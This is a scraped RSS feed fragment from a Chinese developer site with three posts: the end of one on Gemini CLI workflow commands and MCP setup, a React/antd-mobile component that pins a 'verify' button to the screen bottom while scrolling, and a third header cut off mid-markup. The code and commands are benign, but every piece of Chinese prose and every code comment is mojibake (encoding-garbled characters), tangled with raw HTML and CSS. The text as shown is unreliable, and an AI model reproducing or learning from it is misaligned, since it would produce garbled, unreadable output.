<p>AI ä¾ç„¶å†™å¾—å¾ˆå¿«ï¼Œä½†<strong>ä¸å†å¤±æ§</strong>ã€‚</p>
<p><strong>Vibe Coding ä¸æ˜¯æ”¾é£ï¼Œè€Œæ˜¯å»ºç«‹ä¿¡ä»»çš„å‰æã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/426487422a3d4530874891e416853ff2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=ekGXudpt74VSqRKSKPbZ1s31zhA%3D" alt="æˆªå±2026-01-08 15.59.02.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-10"><strong>å†™åœ¨æœ€åï¼š2026ï¼Œæˆ‘ä¼šç»§ç»­æŠŠ AI å½“æˆå·¥ç¨‹ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†</strong></h2>
<p>2026 å¹´ï¼Œæˆ‘ä¸ä¼šå†è¿½é€â€œæ›´å¼ºçš„æç¤ºè¯â€ã€‚</p>
<p>æˆ‘ä¼šç»§ç»­ï¼š</p>
<ul>
<li>
<p>åˆ†å±‚ç»´æŠ¤é¡¹ç›®ä¸Šä¸‹æ–‡</p>
</li>
<li>
<p>å›ºåŒ–é«˜é¢‘ä»»åŠ¡ä¸ºå‘½ä»¤</p>
</li>
<li>
<p>ç”¨ MCP è¿æ¥æ›´å¤šçœŸå®æ•°æ®æº</p>
</li>
</ul>
<p>å› ä¸ºæˆ‘å·²ç»ç¡®è®¤äº†ä¸€ä»¶äº‹ï¼š</p>
<blockquote>
<p><strong>å½“ä¸Šä¸‹æ–‡æ¸…æ™°ã€è®°å¿†å¯é ï¼Œ</strong></p>
</blockquote>
<blockquote>
<p><strong>AI æ‰çœŸæ­£å…·å¤‡è¿›å…¥ç”Ÿäº§ç¯å¢ƒçš„èµ„æ ¼ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-11"><strong>åŒä¸ºç¬¬ä¸€æ¢¯é˜Ÿï¼Œæˆ‘ä¸ºä»€ä¹ˆå¯¹â€œä¸Šä¸‹æ–‡èƒ½åŠ›â€æ ¼å¤–æ•æ„Ÿ</strong></h2>
<blockquote>
<p>è¿™ä¸€ç‚¹ï¼Œå…¶å®å’Œæˆ‘åŒæ—¶ä½¿ç”¨ <strong>Codex 5.2</strong> æœ‰å¾ˆå¤§å…³ç³»ã€‚</p>
</blockquote>
<p>2025 å¹´ï¼Œæˆ‘å¹¶ä¸æ˜¯åªç”¨ Geminiã€‚</p>
<p>ä½œä¸ºç¬¬ä¸€æ¢¯é˜Ÿæ¨¡å‹ï¼Œ<strong>Codex 5.2</strong> åœ¨ä»£ç ç”Ÿæˆè´¨é‡ã€é€»è¾‘ä¸¥è°¨æ€§ä¸ŠåŒæ ·éå¸¸å¼ºï¼Œç”šè‡³åœ¨æŸäº›å¤æ‚ç®—æ³•å’ŒæŠ½è±¡å»ºæ¨¡ä¸Šï¼Œè¡¨ç°å¾—æ›´â€œåƒå·¥ç¨‹å¸ˆâ€ã€‚</p>
<p>ä½†åœ¨çœŸå®é¡¹ç›®åä½œä¸­ï¼Œæˆ‘å¾ˆå¿«æ„Ÿå—åˆ°äº†ä¸€ä¸ªå†³å®šæ€§çš„å·®å¼‚ï¼š</p>
<blockquote>
<p><strong>Codex 5.2ï¼ˆå³ä½¿å·²å¼€é€šï¼‰å‡ ä¹ä¸å…·å¤‡â€œé¡¹ç›®çº§ä¸Šä¸‹æ–‡è®°å¿†â€ã€‚</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81a69567e6264016a1bcc5683d8d26e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=GnUXi9VwFyEUNNp16ZgMqOg%2BC1E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12"><strong>é™„ï¼šæˆ‘åœ¨é¡¹ç›®ä¸­ä½¿ç”¨çš„å…³é”®å‘½ä»¤ï¼ˆèŠ‚é€‰ï¼‰</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŒä¹…åŒ–ä¸Šä¸‹æ–‡</span>
GEMINI.md

<span class="hljs-comment"># çŸ­æœŸè®°å¿†</span>
/memory add
/memory show
/memory refresh

<span class="hljs-comment"># å‹ç¼©å¯¹è¯</span>
/compress

<span class="hljs-comment"># å¼•ç”¨çœŸå®æ–‡ä»¶</span>
@./src/

<span class="hljs-comment"># Shell ç›´é€š</span>
!git status
!pnpm <span class="hljs-built_in">test</span>

<span class="hljs-comment"># å®‰è£… chrome-devtools-mcp</span>
gemini mcp add -s user chrome-devtools npx chrome-devtools-mcp@latest
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ]]></title>    <link>https://juejin.cn/post/7592805973120761862</link>    <guid>https://juejin.cn/post/7592805973120761862</guid>    <pubDate>2026-01-08T10:00:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120761862" data-draft-id="7592805973120712710" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T10:00:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="snowæ¥äº†"/> <meta itemprop="url" content="https://juejin.cn/user/1714893871392792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨æ‰‹æœºç«¯åšä¸ªæ»šåŠ¨æ•ˆæœ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893871392792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    snowæ¥äº†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:00:20.000Z" title="Thu Jan 08 2026 10:00:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”¨reactå¼€å‘ä¸€ä¸ªantd mobileç»„ä»¶,é¡µé¢ä¸Šæœ‰å¤šä¸ªé«˜åº¦ä¸ç­‰çš„divå…ƒç´ ,æ¯ä¸ªdivåº•éƒ¨éƒ½æœ‰ä¸€ä¸ªã€Œæ ¸å¯¹ã€æŒ‰é’®ã€‚å½“divçš„é«˜åº¦å¤§äºå±å¹•é«˜åº¦çš„æ—¶å€™ï¼Œå°±è¦å°†è¿™ä¸ªdivåº•éƒ¨çš„ã€Œæ ¸å¯¹ã€æŒ‰é’®é”å®šåœ¨é¡µé¢åº•éƒ¨ï¼Œæ–¹ä¾¿ç”¨æˆ·æ“ä½œã€‚å½“ç”¨æˆ·æ»šåŠ¨é¡µé¢ï¼Œè¿™ä¸ªdivçš„åº•éƒ¨è¿›å…¥å±å¹•çš„æ—¶å€™ï¼Œå°±è¦å–æ¶ˆã€Œæ ¸å¯¹ã€æŒ‰é’®çš„é”å®šï¼Œè¦å®ƒå›å½’åŸå¤„ï¼Œè·Ÿéšè¿™ä¸ªdivè¿›è¡Œæ»šåŠ¨ã€‚å½“ç¬¬äºŒä¸ªdivè¿›å…¥å±å¹•50%çš„æ—¶å€™ï¼Œåœ¨æ­¤å°†å®ƒçš„ã€Œæ ¸å¯¹ã€æŒ‰é’®é”å®šåœ¨é¡µé¢ä¸Šã€‚ä½ å¸®æˆ‘ç”¨ç›‘å¬æ»šåŠ¨çš„æ–¹å¼å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œæ‰€æœ‰çš„ä»£ç éƒ½å†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œç»„ä»¶çš„åå­—å«ï¼šMaterialVerificationSon</p>
<p>å¦‚æœå‡ºç°æŒ‰é’®å–æ¶ˆé”å®šæœ‰æŠ–åŠ¨ï¼Œæ˜¯æ ·å¼é—®é¢˜ï¼Œç”¨    transform: isFixed ? 'translateX(-2px)' : 'none',å¯ä»¥è§£å†³</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd-mobile'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// import { useLocation } from '@tanstack/react-location';</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">MaterialVerificationSon</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ç¤ºä¾‹æ•°æ®ï¼šåŒ…å«ä¸åŒé«˜åº¦çš„divå†…å®¹</span>
  <span class="hljs-keyword">const</span> [items] = <span class="hljs-title function_">useState</span>([
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬ä¸€ä¸ªææ–™é¡¹ï¼Œé«˜åº¦é€‚ä¸­'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">780</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬äºŒä¸ªææ–™é¡¹ï¼Œé«˜åº¦è¾ƒé«˜ï¼Œå†…å®¹è¾ƒå¤šï¼Œéœ€è¦æ»šåŠ¨æŸ¥çœ‹'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">800</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬ä¸‰ä¸ªææ–™é¡¹ï¼Œé«˜åº¦éå¸¸é«˜ï¼Œå†…å®¹éå¸¸å¤šï¼Œéœ€è¦å¤§é‡æ»šåŠ¨'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1200</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">4</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬å››ä¸ªææ–™é¡¹ï¼Œé«˜åº¦é€‚ä¸­'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">400</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'è¿™æ˜¯ç¬¬äº”ä¸ªææ–™é¡¹ï¼Œé«˜åº¦è¾ƒé«˜'</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">900</span> },
  ]);
  <span class="hljs-keyword">const</span> contentRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªå…ƒç´ çš„ref</span>
  <span class="hljs-keyword">const</span> itemRefs = useRef&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-title class_">HTMLDivElement</span> | <span class="hljs-literal">null</span>&gt;&gt;([]);
  <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªæŒ‰é’®çš„é”å®šçŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [lockedButtons, setLockedButtons] = useState&lt;<span class="hljs-title class_">Record</span>&lt;number, boolean&gt;&gt;({});

  <span class="hljs-comment">// è·å–å±å¹•é«˜åº¦</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getScreenHeight</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦åœ¨è§†å£ä¸­</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">return</span> rect.<span class="hljs-property">top</span> &lt; <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; rect.<span class="hljs-property">bottom</span> &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ åº•éƒ¨æ˜¯å¦åœ¨è§†å£å†…</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementBottomInViewport</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementBottom = rect.<span class="hljs-property">bottom</span>;
    <span class="hljs-keyword">return</span> elementBottom &lt;= <span class="hljs-title function_">getScreenHeight</span>() &amp;&amp; elementBottom &gt; <span class="hljs-number">0</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦è‡³å°‘æœ‰50%åœ¨è§†å£å†…</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementHalfVisible</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
    <span class="hljs-keyword">const</span> elementHeight = rect.<span class="hljs-property">height</span>;
    <span class="hljs-keyword">const</span> visibleHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-title function_">getScreenHeight</span>() - rect.<span class="hljs-property">top</span>, <span class="hljs-number">0</span>), elementHeight);
    <span class="hljs-keyword">return</span> visibleHeight / elementHeight &gt;= <span class="hljs-number">0.5</span>;
  };

  <span class="hljs-comment">// æ£€æŸ¥å…ƒç´ æ˜¯å¦è¿‡é«˜ï¼ˆè¶…è¿‡å±å¹•é«˜åº¦ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">isElementTooTall</span> = (<span class="hljs-params">element: HTMLElement</span>) =&gt; {
    <span class="hljs-keyword">return</span> element.<span class="hljs-property">scrollHeight</span> &gt; <span class="hljs-title function_">getScreenHeight</span>();
  };

  <span class="hljs-comment">// å¤„ç†æ»šåŠ¨äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleScroll</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newLockedButtons</span>: <span class="hljs-title class_">Record</span>&lt;number, boolean&gt; = {};

    items.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> element = itemRefs.<span class="hljs-property">current</span>[index];
      <span class="hljs-keyword">if</span> (!element) <span class="hljs-keyword">return</span>;

      <span class="hljs-keyword">const</span> elementTooTall = <span class="hljs-title function_">isElementTooTall</span>(element); <span class="hljs-comment">//æ˜¯å¦å¤§äºå±å¹•é«˜åº¦</span>
      <span class="hljs-keyword">const</span> elementInViewport = <span class="hljs-title function_">isElementInViewport</span>(element); <span class="hljs-comment">//æ˜¯ä¸æ˜¯åœ¨è§†å£é‡Œé¢</span>
      <span class="hljs-keyword">const</span> elementBottomInViewport = <span class="hljs-title function_">isElementBottomInViewport</span>(element); <span class="hljs-comment">//æ£€æŸ¥å…ƒç´ åº•éƒ¨æ˜¯å¦åœ¨è§†å£å†…</span>
      <span class="hljs-keyword">const</span> elementHalfVisible = <span class="hljs-title function_">isElementHalfVisible</span>(element); <span class="hljs-comment">//è§†å£50%</span>

      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(elementInViewport, index);
      <span class="hljs-keyword">if</span> (elementInViewport &amp;&amp; elementTooTall &amp;&amp; elementHalfVisible) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">true</span>;
      }

      <span class="hljs-keyword">if</span> (elementBottomInViewport) {
        newLockedButtons[item.<span class="hljs-property">id</span>] = <span class="hljs-literal">false</span>;
      }
    });

    <span class="hljs-title function_">setLockedButtons</span>(newLockedButtons);
  };
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(lockedButtons, <span class="hljs-number">9999</span>);
  <span class="hljs-comment">// æ·»åŠ æ»šåŠ¨äº‹ä»¶ç›‘å¬å™¨</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
      contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      <span class="hljs-comment">// åˆå§‹æ‰§è¡Œä¸€æ¬¡</span>
      <span class="hljs-title function_">handleScroll</span>();
    }

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (contentRef.<span class="hljs-property">current</span>) {
        contentRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, handleScroll);
      }
    };
  }, []);

  <span class="hljs-comment">// æ ¸å¯¹æŒ‰é’®ç‚¹å‡»å¤„ç†</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleVerify</span> = (<span class="hljs-params">id: number</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ ¸å¯¹æŒ‰é’®è¢«ç‚¹å‡»ï¼ŒID: <span class="hljs-subst">${id}</span>`</span>);
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ·»åŠ å…·ä½“çš„æ ¸å¯¹é€»è¾‘</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">16px</span>', <span class="hljs-attr">height:</span> '<span class="hljs-attr">100vh</span>', <span class="hljs-attr">overflowY:</span> '<span class="hljs-attr">auto</span>' }} <span class="hljs-attr">ref</span>=<span class="hljs-string">{contentRef}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ææ–™æ ¸å¯¹é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>

      {items.map((item, index) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span>
          <span class="hljs-attr">ref</span>=<span class="hljs-string">{el</span> =&gt;</span> (itemRefs.current[index] = el)}
          style={{
            border: '1px solid #ddd',
            borderRadius: '8px',
            padding: '16px',
            marginBottom: '16px',
            overflowY: 'auto',
          }}
        &gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ææ–™é¡¹ {item.id}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{item.content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é«˜åº¦: {item.height}px<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">item.height</span>}<span class="hljs-attr">px</span>` }}&gt;</span>
            è¿™æ˜¯ä¸€ä¸ªç¤ºä¾‹å†…å®¹ï¼Œå®é™…åº”ç”¨ä¸­è¿™é‡Œä¼šæœ‰å…·ä½“çš„ææ–™ä¿¡æ¯ã€‚
          <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

          {/* æ ¸å¯¹æŒ‰é’® */}
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
              <span class="hljs-attr">position:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">fixed</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">static</span>',
              <span class="hljs-attr">bottom:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">20px</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">left:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">50</span>%' <span class="hljs-attr">:</span> '<span class="hljs-attr">auto</span>',
              <span class="hljs-attr">transform:</span> <span class="hljs-attr">lockedButtons</span>[<span class="hljs-attr">item.id</span>] ? '<span class="hljs-attr">translateX</span>(<span class="hljs-attr">-50</span>%)' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>',
              <span class="hljs-attr">zIndex:</span> <span class="hljs-attr">1000</span>,
              <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%',
              <span class="hljs-attr">display:</span> '<span class="hljs-attr">flex</span>',
              <span class="hljs-attr">justifyContent:</span> '<span class="hljs-attr">center</span>',
              <span class="hljs-attr">marginTop:</span> '<span class="hljs-attr">16px</span>',
            }}
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
              <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
              <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleVerify(item.id)}
              style={{
                width: '80%',
                maxWidth: '300px',
              }}
            &gt;
              æ ¸å¯¹1111{index}
            <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢]]></title>    <link>https://juejin.cn/post/7592789801708339241</link>    <guid>https://juejin.cn/post/7592789801708339241</guid>    <pubDate>2026-01-08T07:56:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708339241" data-draft-id="7592572266754195519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JSä¸­å¯¹è±¡æ˜¯æ€ä¹ˆè¿ç®—çš„å‘¢"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T07:56:31.000Z"/> <meta itemprop="image" 